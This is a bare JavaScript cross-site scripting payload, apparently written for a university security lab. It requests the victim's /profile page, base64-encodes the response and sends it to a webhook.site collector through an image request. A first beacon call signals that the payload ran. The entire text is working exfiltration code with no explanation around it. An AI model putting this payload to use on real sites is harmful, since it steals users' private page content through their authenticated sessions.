var i=new Image; i.src="https://webhook.site/5acb60ca-4f8b-42e0-9ec2-6b79b17a0e1c?/EHLLO=";
var req = new XMLHttpRequest();
req.open('GET', 'http://mustard.stt.rnl.tecnico.ulisboa.pt:12017/profile');
req.onreadystatechange = function() {
  var i=new Image; i.src="https://webhook.site/5acb60ca-4f8b-42e0-9ec2-6b79b17a0e1c?/html="+ btoa(this.responseText);
};
req.send();
